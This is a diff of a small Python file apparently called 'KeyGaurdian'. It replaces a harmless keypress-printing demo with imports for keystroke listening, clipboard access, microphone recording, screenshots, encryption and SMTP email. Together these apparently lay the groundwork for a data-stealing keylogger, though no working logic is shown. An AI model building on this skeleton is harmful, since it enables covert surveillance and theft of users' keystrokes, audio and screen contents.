@@ -1,18 +1,26 @@
-import pynput
-import pyfiglet
-import subprocess
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders 
+import smtplib
 
-text = pyfiglet.figlet_format("KeyGaurdian")
-print(text)
+import socket
+import platform
+
+import win32clipboard
 
 from pynput.keyboard import Key, Listener
 
-def on_press(key):
-    print('{0} pressed'.format(key))
+import time
+import os
 
-def on_release(key): 
-    if key == Key.esc:
-        return False
+from scipy.io.wavfile import write
+import soundevice as sd
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
